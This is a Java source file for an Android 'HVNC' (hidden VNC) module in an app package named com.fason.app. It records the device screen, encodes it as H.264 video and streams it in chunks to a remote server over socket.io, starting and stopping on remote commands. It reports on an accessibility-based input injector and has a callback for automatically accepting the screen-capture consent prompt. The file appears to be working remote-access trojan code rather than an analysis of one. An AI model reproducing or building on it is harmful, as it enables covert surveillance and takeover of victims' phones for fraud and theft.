package com.fason.app.features.hvnc;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.MediaCodec;
import android.media.MediaCodecInfo;
import android.media.MediaFormat;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.SocketCommandRouter;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.nio.ByteBuffer;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public final class HVncManager {
    private static final String TAG = "HVncManager";
    private static final int DEFAULT_FPS = 20;
    private static final int DEFAULT_QUALITY = 60;
    private static final int DEFAULT_SCALE_PERCENT = 50;
    private static final int MAX_FRAME_SIZE = 512 * 1024;
    private static final int CHUNK_SIZE = 64 * 1024;
    private static final int MAX_DECODE_QUEUE = 5;
    private static volatile HVncManager instance;
    private final Object lock = new Object();
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private MediaCodec encoder;
    private android.view.Surface encoderInputSurface;
    private HandlerThread encoderThread;
    private Handler encoderHandler;
    private MediaProjection.Callback projectionCallback;
    private volatile boolean streaming = false;
    private volatile int fps = DEFAULT_FPS;
    private volatile int bitrate = 1_500_000;
    private volatile int scalePercent = DEFAULT_SCALE_PERCENT;
    private volatile int screenWidth = 0;
    private volatile int screenHeight = 0;
    private volatile int encodedWidth = 0;
    private volatile int encodedHeight = 0;
    private volatile float inputScaleX = 1f;
    private volatile float inputScaleY = 1f;
    private volatile int iframeInterval = 0;
    private volatile int resultCode = 0;
    private volatile Intent resultData = null;
    private volatile int pendingFps = DEFAULT_FPS;
    private volatile int pendingQuality = DEFAULT_QUALITY;
    private volatile int pendingScale = DEFAULT_SCALE_PERCENT;
    private volatile String pendingCmdId = null;
    private volatile boolean hasPendingStart = false;
    private final BlockingQueue<EncodedFrame> frameQueue = new LinkedBlockingQueue<>(MAX_DECODE_QUEUE);
    private volatile Thread senderThread = null;
    private volatile boolean senderRunning = false;
    private final Object senderLock = new Object();
    private io.socket.emitter.Emitter.Listener disconnectListener = null;
    private HandlerThread cbThread = null;
    private volatile boolean restartInProgress = false;
    private volatile boolean stopRequested = false;
    private volatile boolean stopQueued = false;
    private volatile boolean codecConfigSent = false;
    private volatile byte[] cachedAvcC;
    private io.socket.emitter.Emitter.Listener connectListener = null;

    private HVncManager() {}
    private static final class EncodedFrame {
        final byte[] data;
        final long ptsUs;
        final boolean keyframe;
        EncodedFrame(byte[] data, long ptsUs, boolean keyframe) {
            this.data = data;
            this.ptsUs = ptsUs;
            this.keyframe = keyframe;
        }
    }

    public static HVncManager getInstance() {
        if (instance == null) {
            synchronized (HVncManager.class) {
                if (instance == null) instance = new HVncManager();
            }
        }
        return instance;
    }

    public void setProjectionResult(int code, Intent data) {
        this.resultCode = code;
        this.resultData = data;
        if (code != 0 && data != null && hasPendingStart) {
            hasPendingStart = false;
            SocketCommandRouter.EXEC.execute(() ->
                start(pendingFps, pendingQuality, pendingScale, pendingCmdId));
        }
    }

    public void onInputAck(boolean completed) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TYPE, "input_ack");
            data.put("completed", completed);
            data.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            socket.emit(Protocol.HVNC, data);
        } catch (Exception ignored) {}
    }

    public void setPendingStart(int fps, int quality, int scale, String cmdId) {
        this.pendingFps = fps;
        this.pendingQuality = quality;
        this.pendingScale = scale;
        this.pendingCmdId = cmdId;
        this.hasPendingStart = true;
    }

    public void setIframeInterval(int seconds) {
        iframeInterval = Math.max(0, Math.min(seconds, 10));
    }

    public void clearPendingStart() {
        hasPendingStart = false;
        sendStatus("permission_denied", null);
    }

    public float getInputScaleX() { return inputScaleX; }
    public float getInputScaleY() { return inputScaleY; }
    public boolean hasProjectionPermission() {
        return resultCode != 0 && resultData != null;
    }

    public static boolean needsPermissionRequest() {
        return !getInstance().hasProjectionPermission();
    }

    public static Intent createScreenCaptureIntent() {
        Context ctx = FasonApp.getContext();
        MediaProjectionManager mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        return mpm.createScreenCaptureIntent();
    }

    private static int qualityToBitrate(int quality) {
        quality = Math.max(10, Math.min(quality, 100));
        return (int) (300_000 + (quality - 10) * (3_000_000 - 300_000) / 90.0);
    }

    @SuppressLint("WrongConstant")
    public void start(int fps, int quality, int scalePercent, String cmdId) {
        synchronized (lock) {
            if (streaming) {
                sendStatus("already_streaming", cmdId);
                return;
            }
            if (!hasProjectionPermission()) {
                sendStatus("no_permission", cmdId);
                return;
            }
            if (restartInProgress) {
                sendStatus("restart_in_progress", cmdId);
                return;
            }
            this.fps = Math.max(1, Math.min(fps > 0 ? fps : DEFAULT_FPS, 60));
            this.bitrate = qualityToBitrate(quality);
            this.scalePercent = Math.max(10, Math.min(scalePercent > 0 ? scalePercent : DEFAULT_SCALE_PERCENT, 100));
            this.iframeInterval = Math.max(0, Math.min(this.iframeInterval, 10));
            try {
                Context ctx = FasonApp.getContext();
                com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
                if (svc != null) svc.upgradeForMediaProjection();
                MediaProjectionManager mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                mediaProjection = mpm.getMediaProjection(resultCode, resultData);
                if (mediaProjection == null) {
                    sendStatus("projection_failed", cmdId);
                    stopInternal(true);
                    return;
                }
                cbThread = new HandlerThread("HVncMpCb");
                cbThread.start();
                final Handler cbHandler = new Handler(cbThread.getLooper());
                projectionCallback = new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        Log.w(TAG, "Projection stopped");
                        if (streaming) SocketCommandRouter.EXEC.execute(() -> stop());
                    }
                };
                mediaProjection.registerCallback(projectionCallback, cbHandler);
                encoderThread = new HandlerThread("HVncEncoder");
                encoderThread.start();
                encoderHandler = new Handler(encoderThread.getLooper());
                int[] dims = computeDimensions(ctx);
                int targetWidth = dims[0], targetHeight = dims[1];
                encodedWidth = targetWidth;
                encodedHeight = targetHeight;
                inputScaleX = (float) screenWidth / targetWidth;
                inputScaleY = (float) screenHeight / targetHeight;
                if (!createAndStartEncoder(targetWidth, targetHeight)) {
                    sendStatus("encoder_failed", cmdId);
                    stopInternal(true);
                    return;
                }
                if (virtualDisplay == null) {
                    sendStatus("virtual_display_failed", cmdId);
                    stopInternal(true);
                    return;
                }
                codecConfigSent = false;
                stopRequested = false;
                stopQueued = false;
                frameQueue.clear();
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) {
                    disconnectListener = args -> {
                        if (streaming || restartInProgress) {
                            Log.w(TAG, "Socket disconnected, stopping HVNC");
                            SocketCommandRouter.EXEC.execute(() -> stop());
                        }
                    };
                    socket.on(Socket.EVENT_DISCONNECT, disconnectListener);
                    connectListener = args -> {
                        codecConfigSent = false;
                        if (cachedAvcC != null) {
                            sendCodecConfig(cachedAvcC);
                        }
                        if (encoder != null) {
                            try {
                                android.os.Bundle params = new android.os.Bundle();
                                params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0);
                                encoder.setParameters(params);
                            } catch (Exception ignored) {}
                        }
                    };
                    socket.on(Socket.EVENT_CONNECT, connectListener);
                }
                streaming = true;
                startSenderThread();
                sendStatus("streaming", cmdId);
                Log.i(TAG, "HVNC streaming " + targetWidth + "x" + targetHeight
                    + " @" + this.fps + "fps " + (this.bitrate / 1000) + "kbps");
            } catch (Exception e) {
                Log.e(TAG, "HVNC start failed", e);
                sendStatus("error: " + e.getMessage(), cmdId);
                stopInternal(true);
            }
        }
    }

    public void stop() {
        synchronized (lock) {
            if (restartInProgress) {
                stopRequested = true;
                Log.i(TAG, "Stop during restart, aborting");
                return;
            }
            if (!streaming && mediaProjection == null && encoder == null
                && encoderThread == null && cbThread == null && disconnectListener == null) {
                Log.i(TAG, "Stop called, nothing active");
                return;
            }
            stopInternal(true);
        }
    }

    private void stopInternal(boolean clearToken) {
        boolean wasStreaming = streaming;
        streaming = false;
        stopRequested = false;
        stopQueued = false;
        codecConfigSent = false;
        stopSenderThread();
        frameQueue.clear();
        releaseEncoderAndDisplay();
        if (encoderThread != null) { encoderThread.quitSafely(); encoderThread = null; }
        encoderHandler = null;
        try {
            if (mediaProjection != null) {
                Socket socket = SocketClient.getInstance().getSocket();
                if (socket != null) {
                    if (disconnectListener != null) {
                        socket.off(Socket.EVENT_DISCONNECT, disconnectListener);
                    }
                    if (connectListener != null) {
                        socket.off(Socket.EVENT_CONNECT, connectListener);
                    }
                }
                disconnectListener = null;
                connectListener = null;
                if (projectionCallback != null) {
                    try { mediaProjection.unregisterCallback(projectionCallback); } catch (Exception ignored) {}
                }
                projectionCallback = null;
                mediaProjection.stop();
            }
        } catch (Exception ignored) {}
        mediaProjection = null;
        if (cbThread != null) { try { cbThread.quitSafely(); } catch (Exception ignored) {} cbThread = null; }
        if (clearToken) {
            resultCode = 0;
            resultData = null;
            inputScaleX = 1f;
            inputScaleY = 1f;
            iframeInterval = 0;
        }
        com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
        if (svc != null) svc.downgradeFromMediaProjection();
        if (wasStreaming && clearToken) sendStatus("stopped", null);
    }

    public void restart(int fps, int quality, int scalePercent, String cmdId) {
        synchronized (lock) {
            if (!streaming) {
                Log.w(TAG, "Restart called, not streaming");
                return;
            }
            if (restartInProgress) {
                Log.d(TAG, "Restart in progress, skipping");
                return;
            }
            restartInProgress = true;
            stopRequested = false;
            try {
                this.fps = Math.max(1, Math.min(fps > 0 ? fps : this.fps, 60));
                this.bitrate = qualityToBitrate(quality);
                this.scalePercent = Math.max(10, Math.min(scalePercent > 0 ? scalePercent : this.scalePercent, 100));
                Log.i(TAG, "Restarting encoder: " + this.fps + "fps " + (this.bitrate / 1000) + "kbps");
                streaming = false;
                stopSenderThread();
                frameQueue.clear();
                releaseEncoderAndDisplay();
                Context ctx = FasonApp.getContext();
                int[] dims = computeDimensions(ctx);
                int targetWidth = dims[0], targetHeight = dims[1];
                encodedWidth = targetWidth;
                encodedHeight = targetHeight;
                inputScaleX = (float) screenWidth / targetWidth;
                inputScaleY = (float) screenHeight / targetHeight;
                if (!createAndStartEncoder(targetWidth, targetHeight)) {
                    sendStatus("encoder_failed", cmdId);
                    stopInternal(false);
                    return;
                }
                if (virtualDisplay == null) {
                    sendStatus("virtual_display_failed", cmdId);
                    stopInternal(false);
                    return;
                }
                if (stopRequested) {
                    Log.i(TAG, "Stop during restart");
                    stopInternal(false);
                    return;
                }
                codecConfigSent = false;
                streaming = true;
                startSenderThread();
                sendStatus("streaming", cmdId);
                Log.i(TAG, "HVNC restarted " + targetWidth + "x" + targetHeight);
            } catch (Exception e) {
                Log.e(TAG, "Restart failed", e);
                sendStatus("error: restart " + e.getMessage(), cmdId);
                stopInternal(false);
            } finally {
                restartInProgress = false;
            }
        }
    }

    private int[] computeDimensions(Context ctx) {
        android.view.WindowManager wm = (android.view.WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.view.WindowMetrics wmMetrics = wm.getCurrentWindowMetrics();
            android.graphics.Rect bounds = wmMetrics.getBounds();
            screenWidth = bounds.width();
            screenHeight = bounds.height();
        } else {
            android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
        }
        int targetWidth = Math.max(2, ((int) (screenWidth * (this.scalePercent / 100.0))) & ~1);
        int targetHeight = Math.max(2, ((int) (screenHeight * (this.scalePercent / 100.0))) & ~1);
        return new int[] { targetWidth, targetHeight };
    }

    private boolean createAndStartEncoder(int targetWidth, int targetHeight) {
        try {
            MediaFormat format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, targetWidth, targetHeight);
            format.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
            format.setInteger(MediaFormat.KEY_BIT_RATE, this.bitrate);
            format.setInteger(MediaFormat.KEY_FRAME_RATE, this.fps);
            format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, iframeInterval);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                format.setInteger(MediaFormat.KEY_LOW_LATENCY, 1);
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                format.setInteger(MediaFormat.KEY_PRIORITY, 0);
            }
            encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
            encoder.setCallback(new EncoderCallback(), encoderHandler);
            encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
            encoderInputSurface = encoder.createInputSurface();
            encoder.start();
            Context ctx = FasonApp.getContext();
            int densityDpi = ctx.getResources().getDisplayMetrics().densityDpi;
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "HVncDisplay", targetWidth, targetHeight, densityDpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                encoderInputSurface, null, null
            );
            return virtualDisplay != null;
        } catch (Exception e) {
            Log.e(TAG, "Encoder creation failed", e);
            return false;
        }
    }

    private void releaseEncoderAndDisplay() {
        try { if (virtualDisplay != null) virtualDisplay.release(); } catch (Exception ignored) {}
        virtualDisplay = null;
        try { if (encoderInputSurface != null) encoderInputSurface.release(); } catch (Exception ignored) {}
        encoderInputSurface = null;
        try { if (encoder != null) encoder.stop(); } catch (Exception ignored) {}
        try { if (encoder != null) encoder.release(); } catch (Exception ignored) {}
        encoder = null;
    }

    private final class EncoderCallback extends MediaCodec.Callback {
        @Override
        public void onInputBufferAvailable(MediaCodec codec, int index) {}
        @Override
        public void onOutputBufferAvailable(MediaCodec codec, int index, MediaCodec.BufferInfo info) {
            ByteBuffer outBuf = codec.getOutputBuffer(index);
            if (outBuf == null) { codec.releaseOutputBuffer(index, false); return; }
            if ((info.flags & MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                byte[] config = new byte[info.size];
                outBuf.position(info.offset);
                outBuf.limit(info.offset + info.size);
                outBuf.get(config);
                sendCodecConfig(config);
                codec.releaseOutputBuffer(index, false);
                return;
            }
            if (info.size > 0 && streaming) {
                byte[] annexB = new byte[info.size];
                outBuf.position(info.offset);
                outBuf.limit(info.offset + info.size);
                outBuf.get(annexB);
                byte[] avcc = annexBToLengthPrefixed(annexB);
                if (avcc == null) {
                    codec.releaseOutputBuffer(index, false);
                    return;
                }
                boolean keyframe = (info.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0;
                EncodedFrame frame = new EncodedFrame(avcc, info.presentationTimeUs, keyframe);
                if (!frameQueue.offer(frame)) {
                    Log.d(TAG, "Frame dropped, queue full");
                }
            }
            codec.releaseOutputBuffer(index, false);
        }
        @Override
        public void onError(MediaCodec codec, MediaCodec.CodecException e) {
            Log.e(TAG, "Encoder error", e);
            sendStatus("error: encoder " + e.getErrorCode(), null);
            if (!stopQueued) {
                stopQueued = true;
                SocketCommandRouter.EXEC.execute(() -> stop());
            }
        }
        @Override
        public void onOutputFormatChanged(MediaCodec codec, MediaFormat format) {
            ByteBuffer sps = format.getByteBuffer("csd-0");
            ByteBuffer pps = format.getByteBuffer("csd-1");
            if (sps != null || pps != null) {
                try {
                    byte[] startCode = { 0x00, 0x00, 0x00, 0x01 };
                    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                    if (sps != null) { ByteBuffer d = sps.duplicate(); byte[] b = new byte[d.remaining()]; d.get(b); bos.write(startCode); bos.write(b); }
                    if (pps != null) { ByteBuffer d = pps.duplicate(); byte[] b = new byte[d.remaining()]; d.get(b); bos.write(startCode); bos.write(b); }
                    sendCodecConfig(bos.toByteArray());
                } catch (Exception ignored) {}
            }
        }
    }

    public boolean isStreaming() {
        return streaming;
    }

    private void sendCodecConfig(byte[] annexBConfig) {
        if (codecConfigSent) return;
        byte[] avcC = annexBToAvcC(annexBConfig);
        if (avcC == null) {
            Log.e(TAG, "SPS/PPS conversion failed");
            return;
        }
        cachedAvcC = avcC;
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null || !socket.connected()) return;
        try {
            JSONObject meta = new JSONObject();
            meta.put(Protocol.KEY_TYPE, "config");
            meta.put(Protocol.KEY_WIDTH, encodedWidth);
            meta.put(Protocol.KEY_HEIGHT, encodedHeight);
            meta.put(Protocol.KEY_FPS, fps);
            meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            Object[] args = new Object[] { meta, avcC };
            socket.emit(Protocol.HVNC, args);
            codecConfigSent = true;
        } catch (Exception e) {
            Log.e(TAG, "Codec config send failed", e);
        }
    }

    private static java.util.List<byte[]> splitNalUnits(byte[] annexB) {
        java.util.List<byte[]> nals = new java.util.ArrayList<>();
        if (annexB == null || annexB.length == 0) return nals;
        int i = 0;
        while (i < annexB.length) {
            int nalStart = -1;
            if (i + 3 < annexB.length && annexB[i] == 0 && annexB[i+1] == 0 && annexB[i+2] == 0 && annexB[i+3] == 1) {
                nalStart = i + 4;
            } else if (i + 2 < annexB.length && annexB[i] == 0 && annexB[i+1] == 0 && annexB[i+2] == 1) {
                nalStart = i + 3;
            }
            if (nalStart == -1) { i++; continue; }
            int nextStart = -1;
            for (int j = nalStart; j <= annexB.length - 3; j++) {
                if (annexB[j] == 0 && annexB[j+1] == 0) {
                    if (annexB[j+2] == 1) { nextStart = j; break; }
                    if (j + 3 < annexB.length && annexB[j+2] == 0 && annexB[j+3] == 1) { nextStart = j; break; }
                }
            }
            int nalEnd = nextStart == -1 ? annexB.length : nextStart;
            int nalLen = nalEnd - nalStart;
            if (nalLen > 0) {
                byte[] nal = new byte[nalLen];
                System.arraycopy(annexB, nalStart, nal, 0, nalLen);
                nals.add(nal);
            }
            i = nalEnd;
        }
        return nals;
    }

    private static byte[] annexBToAvcC(byte[] annexB) {
        if (annexB == null || annexB.length < 8) return null;
        try {
            java.util.List<byte[]> nals = splitNalUnits(annexB);
            byte[] sps = null, pps = null;
            for (byte[] nal : nals) {
                if (nal.length == 0) continue;
                int type = nal[0] & 0x1F;
                if (type == 7 && sps == null) sps = nal;
                else if (type == 8 && pps == null) pps = nal;
            }
            if (sps == null || pps == null) return null;
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            out.write(1);
            out.write(sps[1] & 0xFF);
            out.write(sps[2] & 0xFF);
            out.write(sps[3] & 0xFF);
            out.write(0xFF);
            out.write(0xE1);
            out.write((sps.length >> 8) & 0xFF);
            out.write(sps.length & 0xFF);
            out.write(sps);
            out.write(1);
            out.write((pps.length >> 8) & 0xFF);
            out.write(pps.length & 0xFF);
            out.write(pps);
            return out.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "annexBToAvcC failed", e);
            return null;
        }
    }

    private static byte[] annexBToLengthPrefixed(byte[] annexB) {
        if (annexB == null || annexB.length == 0) return null;
        try {
            java.util.List<byte[]> nals = splitNalUnits(annexB);
            if (nals.isEmpty()) return null;
            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
            for (byte[] nal : nals) {
                int nalLen = nal.length;
                out.write((nalLen >> 24) & 0xFF);
                out.write((nalLen >> 16) & 0xFF);
                out.write((nalLen >> 8) & 0xFF);
                out.write(nalLen & 0xFF);
                out.write(nal);
            }
            return out.toByteArray();
        } catch (Exception e) {
            Log.e(TAG, "annexBToLengthPrefixed failed", e);
            return null;
        }
    }

    private void startSenderThread() {
        synchronized (senderLock) {
            if (senderRunning && senderThread != null) return;
            senderRunning = true;
            senderThread = new Thread(() -> {
                while (senderRunning) {
                    try {
                        EncodedFrame frame = frameQueue.poll(200, TimeUnit.MILLISECONDS);
                        if (frame == null) continue;
                        if (!streaming) continue;
                        Socket socket = SocketClient.getInstance().getSocket();
                        if (socket == null || !socket.connected()) continue;
                        if (frame.data.length > MAX_FRAME_SIZE) {
                            sendStatus("frame_dropped_oversized", null);
                            continue;
                        }
                        if (frame.data.length <= CHUNK_SIZE) {
                            JSONObject meta = new JSONObject();
                            meta.put(Protocol.KEY_TYPE, "frame");
                            meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                            meta.put("pts", frame.ptsUs);
                            meta.put("keyframe", frame.keyframe);
                            meta.put(Protocol.KEY_WIDTH, encodedWidth);
                            meta.put(Protocol.KEY_HEIGHT, encodedHeight);
                            meta.put(Protocol.KEY_SIZE, frame.data.length);
                            socket.emit(Protocol.HVNC, new Object[] { meta, frame.data });
                        } else {
                            String transferId = java.util.UUID.randomUUID().toString();
                            int total = (frame.data.length + CHUNK_SIZE - 1) / CHUNK_SIZE;
                            for (int i = 0; i < total && senderRunning; i++) {
                                int off = i * CHUNK_SIZE;
                                int len = Math.min(CHUNK_SIZE, frame.data.length - off);
                                byte[] chunk = new byte[len];
                                System.arraycopy(frame.data, off, chunk, 0, len);
                                JSONObject meta = new JSONObject();
                                meta.put(Protocol.KEY_TYPE, "chunk");
                                meta.put(Protocol.KEY_TRANSFER_ID, transferId);
                                meta.put(Protocol.KEY_CHUNK_INDEX, i);
                                meta.put(Protocol.KEY_TOTAL_CHUNKS, total);
                                meta.put(Protocol.KEY_TOTAL_SIZE, frame.data.length);
                                meta.put("pts", frame.ptsUs);
                                meta.put("keyframe", frame.keyframe);
                                meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
                                socket.emit(Protocol.HVNC, new Object[] { meta, chunk });
                            }
                        }
                    } catch (InterruptedException ie) {
                        break;
                    } catch (Exception e) {
                        Log.e(TAG, "Sender thread error", e);
                    }
                }
            }, "HVncSender");
            senderThread.setDaemon(true);
            senderThread.start();
        }
    }

    private void stopSenderThread() {
        synchronized (senderLock) {
            senderRunning = false;
            Thread t = senderThread;
            if (t != null) {
                try { t.interrupt(); t.join(500); } catch (Exception ignored) {}
                senderThread = null;
            }
        }
    }

    private void sendStatus(String status, String cmdId) {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) return;
        try {
            JSONObject data = new JSONObject();
            data.put(Protocol.KEY_TYPE, "status");
            data.put(Protocol.KEY_STATUS, status);
            data.put("streaming", streaming);
            data.put(Protocol.KEY_WIDTH, encodedWidth);
            data.put(Protocol.KEY_HEIGHT, encodedHeight);
            data.put("accessibilityEnabled", InputInjector.isEnabled());
            data.put("accessibilityConnected", HVncAccessibilityService.isServiceConnected());
            data.put("projectionReady", hasProjectionPermission());
            data.put("codec", "h264");
            if (cmdId != null) data.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.HVNC, data);
        } catch (Exception ignored) {}
    }

    public void onAutoAcceptResult(boolean success, String reason) {
        if (success) {
            Log.i(TAG, "Auto-accept ok");
        } else {
            Log.w(TAG, "Auto-accept failed: " + reason);
            sendStatus("auto_accept_failed:" + (reason == null ? "unknown" : reason), null);
        }
    }
}
